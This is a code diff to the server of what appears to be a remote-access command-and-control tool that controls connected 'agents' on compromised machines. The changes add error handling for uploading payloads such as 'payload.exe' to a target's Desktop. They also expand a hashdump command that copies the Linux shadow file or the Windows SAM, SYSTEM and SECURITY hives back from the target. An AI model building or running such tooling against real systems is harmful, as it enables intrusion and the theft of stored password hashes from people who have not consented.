@@ -4,6 +4,7 @@ from agent import Agent
 from symbols import *
 import select, datetime
 from prompt_toolkit import PromptSession
+import platform
 
 class Server:
                                                                       
@@ -252,7 +253,7 @@ class Server:
                     decoded_data = data.decode("latin1")
                     if (data == SIG_EOF) or (not data):
                         break
-                    if (decoded_data.startswith("ERROR:")):
+                    if (data == FILE_NOT_FOUND):
                         print(decoded_data)
                         os.remove(file)
                         return
@@ -270,11 +271,15 @@ class Server:
             print("Please select a local file path and a remote path\n\tEx: upload payload.exe C:\\Users\\john\\Desktop\\payload.exe")
             return
         self.current_agent.sock.sendall(f"upload {args[1]}".encode())
-        with open(args[0], 'rb') as f:
-            while (chunk := f.read(1024)):
-                self.current_agent.sock.sendall(chunk)
-        self.current_agent.sock.sendall(SIG_EOF)
-        print("File sent to agent")
+        try:
+            with open(args[0], 'rb') as f:
+                while (chunk := f.read(1024)):
+                    self.current_agent.sock.sendall(chunk)
+            self.current_agent.sock.sendall(SIG_EOF)
+            print("File sent to agent")
+        except Exception:
+            print("File not found")
+            self.current_agent.sock.sendall(FILE_NOT_FOUND)
     
     def isAgentSelected(self):
         if self.current_agent.id != 0:
@@ -312,30 +317,46 @@ class Server:
             self.current_agent = Agent(['',''],'',0) # Reset with a dummy agent
 
     def hashdump(self, args):
+        files = []
+
         shadow_filename = "shadow"
         sam_filename = "sam"
         system_filename = "system"
-        args = list(filter(lambda x: x != "", args.split(" ")))
-        if len(args) < 1:
-            print("Please select a path to store the results\n\tEx: hashdump password.hashes")
+        security_filename = "security"
+
+
+        if self.current_agent.os == "Linux":
+            files.append(shadow_filename)
+        elif self.current_agent.os == "Windows":
+            files.append(sam_filename)
+            files.append(system_filename)
+            files.append(security_filename)
+        else:
+            print("OS not supported")
             return
-        file = args[0]
+
         self.current_agent.sock.sendall("hashdump".encode())
-        remfile = False
-        with open(file, 'w+b') as f:
-            while True:
-                data = self.current_agent.sock.recv(1024)
-                decoded_data = data.decode("latin1")
-                if (data == SIG_EOF) or (not data):
-                    break
-                elif (data == ERROR_INSUFFICIENT_PERMS):
-                    print(f"ERROR: Insufficient permissions to dump hashes.")
-                    remfile = True
-                    f.close()
-                    os.remove(file)
-                    return
-                f.write(data)
-        print(f'Hashes saved at {file}')
+        chunk_size = 1024
+        for i in range(len(files)):
+            file_size = 0
+            with open(files[i], 'w+b') as f:
+                while True:
+                    data = self.current_agent.sock.recv(chunk_size)
+                    if (data == SIG_EOF) or (not data):
+                        break
+                    elif (data == ERROR_INSUFFICIENT_PERMS):
+                        print(f"ERROR: Insufficient permissions to dump hashes.")
+                        f.close()
+                        os.remove(files[i])
+                        return
+                    elif (data == FILE_NOT_FOUND):
+                        print(f"ERROR: {files[i]} not found on the target.")
+                        f.close()
+                        os.remove(files[i])
+                        return
+                    f.write(data)
+                    file_size += len(data)
+            print(f'File saved at {files[i]} ({file_size} b)')
 
     def getAgent(self, id):
         for agent in self.agents:
@@ -367,9 +388,9 @@ class Server:
     def isSocketAlive(self, sock):
         """Check if the agents are still alive by checking the readability of the socket"""
         try:
-            sock.settimeout(0.5)
+            sock.settimeout(5)
             # Passing the socket we want to check for readability in first argument with a timeout of 0.5 seconds
-            read_ready, _, _ = select.select([sock], [], [], 0.5)
+            read_ready, _, _ = select.select([sock], [], [], 5)
             if read_ready:
                 data = sock.recv(1)
                 if data == b'':
